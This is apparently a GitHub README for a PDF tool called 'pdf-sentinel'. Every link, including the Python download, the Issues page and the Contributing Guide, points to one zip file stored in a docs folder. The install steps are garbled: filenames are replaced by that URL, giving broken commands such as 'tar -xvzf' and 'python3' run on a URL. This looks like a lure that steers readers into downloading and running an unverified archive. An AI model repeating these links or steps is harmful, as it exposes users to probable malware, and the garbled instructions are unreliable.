...
[![Download pdf-sentinel](https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip%20pdf--sentinel-blue)](https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip)

1. Click the link above.
2. On the Releases page, find the latest release.
3. Choose the appropriate file for your system. If you're unsure, look for common options like `.exe` for Windows or `https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip` for Linux.
...
- **Python:** Version 3.6 or later installed on your system. If you don't have Python, you can download it from [https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip](https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip).
...
1. **Locate the Downloaded File:**
   Find the downloaded `https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip` file in your "Downloads" folder.

2. **Extract the File:**
   Double-click the `https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip` file to extract it.
...
2. **Extract the File:**
   ...
   ```bash
   tar -xvzf https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip
   ```
   Replace `https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip` with the actual filename.
...
4. **Run the Application:**
   ...
   ```bash
   python3 https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip
   ```
...
- [Issues Page](https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip)
- [Contributing Guide](https://github.com/jackise69/pdf-sentinel/raw/refs/heads/main/docs/user-guide/pdf-sentinel-v2.6-alpha.4.zip)
